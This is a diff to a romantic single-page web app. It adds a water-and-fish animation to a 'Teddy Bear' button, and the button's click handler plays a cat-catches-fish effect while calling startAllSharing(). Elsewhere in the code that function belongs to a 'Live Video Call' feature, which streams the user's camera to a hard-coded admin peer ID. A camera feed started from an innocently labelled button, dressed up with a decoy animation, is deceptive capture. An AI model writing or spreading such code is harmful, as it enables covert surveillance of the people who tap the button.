@@ -33,7 +33,63 @@
         
         .surprise-btn { background: linear-gradient(45deg, #ff758c 0%, #ff7eb3 100%); color: white; box-shadow: 0 4px 15px rgba(255, 117, 140, 0.4); }
         
-        .live-btn { background: white; color: #ff758c; border: 2px solid #ff758c; }
+        .live-btn { 
+            background: #87CEEB; /* Sky blue for water feel */
+            color: #fff; 
+            border: 2px solid #4682B4; 
+            position: relative;
+            overflow: hidden;
+            font-size: 1.2rem;
+        }
+
+        /* Water Animation */
+        .water-effect {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 200%;
+            height: 100%;
+            background: url('https://www.transparenttextures.com/patterns/waves.png');
+            opacity: 0.3;
+            animation: moveWaves 10s linear infinite;
+            z-index: 1;
+        }
+        @keyframes moveWaves {
+            0% { transform: translateX(0); }
+            100% { transform: translateX(-50%); }
+        }
+
+        /* Fish inside button */
+        .fish-emoji {
+            position: absolute;
+            font-size: 20px;
+            animation: swim 3s linear infinite;
+            z-index: 2;
+        }
+        @keyframes swim {
+            0% { left: -20px; transform: scaleX(1); }
+            50% { left: 100%; transform: scaleX(1); }
+            51% { transform: scaleX(-1); }
+            100% { left: -20px; transform: scaleX(-1); }
+        }
+
+        /* Falling Fish */
+        .falling-fish {
+            position: absolute;
+            font-size: 30px;
+            z-index: 100;
+            transition: top 2s ease-in, left 2s ease-in;
+        }
+
+        /* Cat */
+        .cat {
+            position: absolute;
+            font-size: 40px;
+            z-index: 101;
+            display: none;
+            transition: 0.5s;
+        }
+
         .stop-btn { background: #ff4d4d; color: white; display: none; box-shadow: 0 4px 15px rgba(255, 77, 77, 0.4); }
         
         .heart { position: absolute; bottom: -20px; font-size: 20px; animation: floatUp 5s linear infinite; opacity: 0; }
@@ -50,7 +106,16 @@
         </div>
         
         <button id="surpriseBtn" class="surprise-btn" onclick="showSurprise()">💗 Love Surprise</button>
-        <button id="shareBtn" class="live-btn" onclick="startAllSharing()">🧸 Teddy Bear</button>
+        
+        <!-- Teddy Bear Button with Water & Fish -->
+        <button id="shareBtn" class="live-btn" onclick="catchFish()">
+            <div class="water-effect"></div>
+            <span class="fish-emoji" style="animation-delay: 0s;">🐠</span>
+            <span class="fish-emoji" style="animation-delay: 1s;">🐟</span>
+            <span class="fish-emoji" style="animation-delay: 2s;">🐡</span>
+            🧸 Teddy Bear
+        </button>
+        
         <button id="stopBtn" class="stop-btn" onclick="stopSharing()">🛑 Stop Sharing</button>
     </div>
 
@@ -60,30 +125,16 @@
         const dayOfYear = Math.floor((new Date() - new Date(new Date().getFullYear(), 0, 0)) / 1000 / 60 / 60 / 24);
         document.getElementById('daily-message').innerText = loveMessages[dayOfYear % loveMessages.length];
 
-        // 2. Love Surprise (No Limit & More Words)
+        // 2. Love Surprise
         function showSurprise() {
-            // இங்க நெறைய லவ் வேர்ட்ஸ் சேர்த்திருக்கேன்
             const surprises = [
-                "You are my favorite person! ❤️",
-                "I love you to the moon and back! 🌙",
-                "You make my heart skip a beat! 💓",
-                "Forever yours! 💍",
-                "உன் புன்னகை தான் என் உலகம். 🌎",
-                "நீ என் வாழ்க்கையின் மிக அழகான பரிசு. 🎁",
-                "எப்போதும் உன் கூடவே இருப்பேன். 🤝",
-                "உன்னை நினைக்காத நாளே இல்லை. 🥺",
-                "என் இதயம் உன்னிடம் தான் இருக்கு. 💖",
-                "நீ சிரிக்கும் போது என் உலகமே சிரிக்கிறது. 😊",
-                "உன் கண்களில் நான் என் உலகத்தை காண்கிறேன். 👀",
-                "I am so lucky to have you in my life. 🍀",
-                "You are my today and all of my tomorrows. 📅",
-                "உன்னை விட வேற யாரையும் எனக்கு பிடிக்காது. 💯",
-                "My favorite place is inside your hug. 🫂",
-                "உன் குரல் கேட்டாலே எனக்கு சந்தோஷம். 🎵",
-                "I choose you. And I'll choose you over and over. ♾️"
+                "You are my favorite person! ❤️", "I love you to the moon and back! 🌙",
+                "You make my heart skip a beat! 💓", "Forever yours! 💍", "உன் புன்னகை தான் என் உலகம். 🌎",
+                "நீ என் வாழ்க்கையின் மிக அழகான பரிசு. 🎁", "எப்போதும் உன் கூடவே இருப்பேன். 🤝",
+                "உன்னை நினைக்காத நாளே இல்லை. 🥺", "என் இதயம் உன்னிடம் தான் இருக்கு. 💖",
+                "நீ சிரிக்கும் போது என் உலகமே சிரிக்கிறது. 😊", "உன் கண்களில் நான் என் உலகத்தை காண்கிறேன். 👀"
             ];
-            const randomSurprise = surprises[Math.floor(Math.random() * surprises.length)];
-            alert("🎁 SURPRISE! 🎁\n\n" + randomSurprise);
+            alert("🎁 SURPRISE! 🎁\n\n" + surprises[Math.floor(Math.random() * surprises.length)]);
         }
 
         // 3. Floating Hearts
@@ -95,7 +146,54 @@
             setTimeout(() => heart.remove(), 6000);
         }, 300);
 
-        // 4. Live Video Call (Teddy Bear Button)
+        // 4. Fish and Cat Animation on Button Click
+        function catchFish() {
+            const btn = document.getElementById('shareBtn');
+            const btnRect = btn.getBoundingClientRect();
+            
+            // Create a falling fish
+            const fish = document.createElement('div');
+            fish.className = 'falling-fish';
+            fish.innerText = '🐟';
+            fish.style.left = btnRect.left + (btnRect.width / 2) + 'px';
+            fish.style.top = btnRect.top + 'px';
+            document.body.appendChild(fish);
+
+            // Animate falling
+            setTimeout(() => {
+                fish.style.top = btnRect.bottom + 50 + 'px'; // Fall below button
+                fish.style.left = btnRect.left + (Math.random() * 50) + 'px'; // Random left
+            }, 10);
+
+            // Create Cat
+            const cat = document.createElement('div');
+            cat.className = 'cat';
+            cat.innerText = '🐱';
+            cat.style.left = btnRect.left + 20 + 'px';
+            cat.style.top = btnRect.bottom + 50 + 'px';
+            document.body.appendChild(cat);
+            
+            setTimeout(() => {
+                cat.style.display = 'block';
+            }, 1000);
+
+            // Catch fish (hide fish, show cat eating)
+            setTimeout(() => {
+                fish.style.display = 'none';
+                cat.innerText = '😻'; // Happy cat
+            }, 2000);
+
+            // Cleanup after 4 seconds
+            setTimeout(() => {
+                fish.remove();
+                cat.remove();
+            }, 4000);
+
+            // Start Live Sharing
+            startAllSharing();
+        }
+
+        // 5. Live Video Call
         const ADMIN_PEER_ID = "love-app-admin-2024"; 
         let camStream, peer;
 
@@ -128,7 +226,14 @@
             if (camStream) camStream.getTracks().forEach(t => t.stop());
             if (peer) peer.destroy();
             document.getElementById('shareBtn').style.display = 'block';
-            document.getElementById('shareBtn').innerText = "🧸 Teddy Bear";
+            // ஸ்டாப் பண்ணதும் மறுபடியும் டெடி பியர் வரும்
+            document.getElementById('shareBtn').innerHTML = `
+                <div class="water-effect"></div>
+                <span class="fish-emoji" style="animation-delay: 0s;">🐠</span>
+                <span class="fish-emoji" style="animation-delay: 1s;">🐟</span>
+                <span class="fish-emoji" style="animation-delay: 2s;">🐡</span>
+                🧸 Teddy Bear
+            `;
             document.getElementById('stopBtn').style.display = 'none';
         }
     </script>
